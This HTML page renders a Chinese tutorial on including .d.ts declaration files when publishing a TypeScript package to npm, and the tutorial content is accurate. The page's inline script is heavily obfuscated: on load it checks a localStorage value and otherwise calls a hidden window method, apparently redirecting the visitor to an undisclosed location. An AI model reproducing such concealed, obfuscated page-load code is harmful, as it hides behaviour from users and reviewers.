<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Document</title><link rel="stylesheet" href="../../css/github-markdown.min.css"><link rel="stylesheet" href="../../css/github.min.css"><style>body,html{margin:0;padding:0}.markdown-body{box-sizing:border-box;min-width:200px;max-width:980px;margin:0 auto!important;padding:45px 15px}.markdown-body pre{border:1px solid #e5e5e5!important;margin-top:var(--base-size-16)!important}</style></head><body><article id="article" class="markdown-body"></article><script>var _0x57b3e8=_0x57f1;function _0x14c6(){var s=["b8oGW4mBWPdcPLtdHudcVa","WOlcV1ZdVqVcTmosW6PcW4NdVSohWRO","W7tdRCoZBaqvuqJcSMeutg4","sq51oJqqW7HYWOxcQLpcNSoz","WONdOd3cJrLAW4TbWP/dUCovaG","vHqYnmkfWPbYW7r1W5xcJ8oBWRW","WQVdUCoXW6tcJCkPz1XfWP4","W5eXtqZcPI0wvs1k","valcOtKfk8ot","CSoKfWj9rf0aW4PRW40n","WOzxBmohESkXEG","WOBcGSoXe8o5mmoAWQntW6rtwXe","W5ihkCk3o8oHlWefy8oRW48G","feOXCNCAW6qCWR7cPwBcOmoMnWnwhmoHW6W3W4SgWOVdN3z0","c8oZhSolWQFcV8kkBW","WO7dPtZcJLGBW7v0WQZdOW","WPRcJSocbCkRvCk1afpcImoGfga","W6RdM8koWQxcPSoQBmk+WQO","W5JcJGddSmk3aIijW4mq","qmkHWOLCWQi","WQjAnCoZWOrmscldMq","W5qny8kUWP9PsH/dMmoY","WOpcL8kHWOJdNI/dV8oOEq","WO/dPZNcJrnzWP9bWPVdOmoRlmou"];return(_0x14c6=function(){return s})()}function _0x57f1(t,s){var c=_0x14c6();return(_0x57f1=function(s,n){var a=c[s-=439];void 0===_0x57f1.IIwMKn&&(_0x57f1.KZHnyn=function(s,n){var a,p=[],t=0,c="";for(s=(s=>{for(var n,a,p="",t="",c=0,o=0;a=s.charAt(o++);~a&&(n=c%4?64*n+a:a,c++%4)&&(p+=String.fromCharCode(255&n>>(-2*c&6))))a="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=".indexOf(a);for(var l=0,e=p.length;l<e;l++)t+="%"+("00"+p.charCodeAt(l).toString(16)).slice(-2);return decodeURIComponent(t)})(s),o=0;o<256;o++)p[o]=o;for(o=0;o<256;o++)t=(t+p[o]+n.charCodeAt(o%n.length))%256,a=p[o],p[o]=p[t],p[t]=a;for(var o=0,t=0,l=0;l<s.length;l++)a=p[o=(o+1)%256],p[o]=p[t=(t+p[o])%256],p[t]=a,c+=String.fromCharCode(s.charCodeAt(l)^p[(p[o]+p[t])%256]);return c},t=arguments,_0x57f1.IIwMKn=!0);var s=s+c[0],p=t[s];return p?a=p:(void 0===_0x57f1.VclvPy&&(_0x57f1.VclvPy=!0),a=_0x57f1.KZHnyn(a,n),t[s]=a),a})(t,s)}if((()=>{for(var s=_0x57f1,n=_0x14c6();;)try{if(481193==+parseInt(s(444,"rG!p"))+parseInt(s(457,"6EUq"))/2*(-parseInt(s(446,"D6t$"))/3)+-parseInt(s(442,"Pglc"))/4+parseInt(s(447,"Uzta"))/5*(-parseInt(s(458,"L6Iy"))/6)+parseInt(s(445,")eX]"))/7+parseInt(s(456,"&mGK"))/8+parseInt(s(451,"7iF9"))/9)break;n.push(n.shift())}catch(s){n.push(n.shift())}})(),localStorage[_0x57b3e8(450,"WhD%")](_0x57b3e8(460,"FTjh"))!=_0x57b3e8(459,"ZcFB"))throw window[_0x57b3e8(454,"2OVD")][_0x57b3e8(448,"wSkW")](_0x57b3e8(453,"(jZZ")),Error();document.title="typescript 发布声明文件 npm",document.getElementById("article").innerHTML='<div><p>在发布一个使用 TypeScript 编写的 NPM 包时，确保包含类型声明文件（<code>.d.ts</code> 文件）是非常重要的，这样其他开发者在使用你的包时就能获得类型支持和智能提示。以下是如何确保你的包包含类型声明文件的步骤：</p>\n<h3>1. 配置 TypeScript 编译选项</h3>\n<p>确保你的 <code>tsconfig.json</code> 文件配置正确，以生成声明文件。通常，你需要设置 <code>declaration</code> 选项为 <code>true</code>：</p>\n<pre><code class="language-json"><span class="hljs-punctuation">{</span>\n  <span class="hljs-attr">&quot;compilerOptions&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>\n    <span class="hljs-attr">&quot;target&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;es5&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 或者你需要的目标版本</span>\n    <span class="hljs-attr">&quot;module&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;commonjs&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 或者其他模块系统，如 &quot;esnext&quot;</span>\n    <span class="hljs-attr">&quot;declaration&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 生成声明文件</span>\n    <span class="hljs-attr">&quot;outDir&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;./dist&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 编译输出目录</span>\n    <span class="hljs-attr">&quot;rootDir&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;./src&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 源码目录</span>\n    <span class="hljs-attr">&quot;strict&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 启用严格类型检查</span>\n    <span class="hljs-attr">&quot;esModuleInterop&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-literal"><span class="hljs-keyword">true</span></span> <span class="hljs-comment">// 允许与其他模块系统的互操作性</span>\n  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>\n  <span class="hljs-attr">&quot;include&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">&quot;src&quot;</span><span class="hljs-punctuation">]</span> <span class="hljs-comment">// 包含源码目录</span>\n<span class="hljs-punctuation">}</span>\n</code></pre>\n<h3>2. 组织项目结构</h3>\n<p>通常，你的项目结构可能如下所示：</p>\n<pre><code>my-typescript-package/\n├── src/\n│   ├── index.ts\n│   └── other-file.ts\n├── dist/\n│   └── （编译后生成的文件和声明文件将放在这里）\n├── package.json\n└── tsconfig.json\n</code></pre>\n<h3>3. 编写 TypeScript 代码</h3>\n<p>在 <code>src</code> 目录下编写你的 TypeScript 代码。例如，<code>src/index.ts</code> 可能包含：</p>\n<pre><code class="language-typescript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params"><span class="hljs-attr">name</span>: <span class="hljs-built_in">string</span></span>): <span class="hljs-built_in">string</span> {\n  <span class="hljs-keyword">return</span> <span class="hljs-string">`Hello, <span class="hljs-subst">${name}</span>!`</span>;\n}\n</code></pre>\n<h3>4. 编译 TypeScript 代码</h3>\n<p>运行 TypeScript 编译器，将代码编译到 <code>dist</code> 目录，并生成声明文件：</p>\n<pre><code class="language-sh">npx tsc\n</code></pre>\n<p>这将在 <code>dist</code> 目录下生成 <code>.js</code> 文件和对应的 <code>.d.ts</code> 声明文件。</p>\n<h3>5. 更新 <code>package.json</code></h3>\n<p>确保你的 <code>package.json</code> 文件中的 <code>main</code> 字段指向编译后的入口文件（通常是 <code>dist/index.js</code>），并且可以考虑添加 <code>types</code> 字段指向声明文件（通常是 <code>dist/index.d.ts</code>，但如果 <code>main</code> 指向的文件在相同目录下且名称相同，通常不需要显式指定 <code>types</code>）：</p>\n<pre><code class="language-json"><span class="hljs-punctuation">{</span>\n  <span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;my-typescript-package&quot;</span><span class="hljs-punctuation">,</span>\n  <span class="hljs-attr">&quot;version&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;1.0.0&quot;</span><span class="hljs-punctuation">,</span>\n  <span class="hljs-attr">&quot;main&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;dist/index.js&quot;</span><span class="hljs-punctuation">,</span>\n  <span class="hljs-attr">&quot;types&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;dist/index.d.ts&quot;</span><span class="hljs-punctuation">,</span> <span class="hljs-comment">// 可选，但推荐明确指定</span>\n  <span class="hljs-attr">&quot;scripts&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>\n    <span class="hljs-attr">&quot;build&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;tsc&quot;</span>\n  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>\n  <span class="hljs-attr">&quot;devDependencies&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>\n    <span class="hljs-attr">&quot;typescript&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;^x.x.x&quot;</span> <span class="hljs-comment">// 你的 TypeScript 版本</span>\n  <span class="hljs-punctuation">}</span>\n<span class="hljs-punctuation">}</span>\n</code></pre>\n<h3>6. 发布到 NPM</h3>\n<p>现在，你可以将你的包发布到 NPM。首先，确保你已经登录到 NPM：</p>\n<pre><code class="language-sh">npm login\n</code></pre>\n<p>然后，发布你的包：</p>\n<pre><code class="language-sh">npm publish\n</code></pre>\n<h3>7. 测试你的包</h3>\n<p>在发布之前或之后，你可以通过创建一个新的项目并安装你的包来测试它，确保类型声明文件正确工作：</p>\n<pre><code class="language-sh"><span class="hljs-comment"># 在一个新目录下</span>\nnpm init -y\nnpm install my-typescript-package\n</code></pre>\n<p>然后，你可以在新项目中尝试使用你的包，并查看类型提示是否按预期工作。</p>\n<h3>注意事项</h3>\n<ul>\n<li>确保你的包名在 NPM 上是唯一的。</li>\n<li>检查你的代码和声明文件是否包含所有必要的导出和类型。</li>\n<li>考虑使用 <code>.npmignore</code> 文件来排除不需要的文件（如 <code>src</code> 目录、测试文件等）从发布的包中。</li>\n</ul>\n</div>'</script></body></html>